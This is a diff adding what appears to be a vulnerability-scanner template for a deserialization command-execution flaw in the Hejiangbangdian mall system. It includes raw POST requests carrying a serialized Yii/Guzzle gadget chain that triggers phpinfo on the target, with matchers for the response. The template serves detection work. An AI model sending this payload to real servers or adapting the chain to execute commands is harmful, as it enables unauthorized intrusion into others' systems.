@@ -1,0 +1,58 @@
+id: hejiangbangdian-mall-command-execution
+
+info:
+  name: Hejiangbangdian Mall Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Hejiangbangdian mall system contains a command execution vulnerability in the index/submit method. Unfiltered parameters passed into unserialize can lead to arbitrary command execution.
+  metadata:
+    product: Hejiangbangdian mall system
+    impact: An attacker can write a Trojan file to the server and obtain permissions.
+    cvss-score: 10.0
+  reference:
+    - https://www.zjhejiang.com/site/index
+
+http:
+  - raw:
+      - |
+        POST /web/index.php?r=api/testOrderSubmit/index/submit&_mall_id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "phpinfo()"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /web/index.php?r=api/testOrderSubmit/index/submit&_mall_id=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "phpinfo()"
+      - type: word
+        part: body
+        words:
+          - "never be unserialized"
+      - type: word
+        part: body
+        words:
+          - "Version: 4.5"
+          - "Version: 4.4"
+          - "Version: 5.1"
+          - "Version: 5.2"
+          - "Version: 5.3"
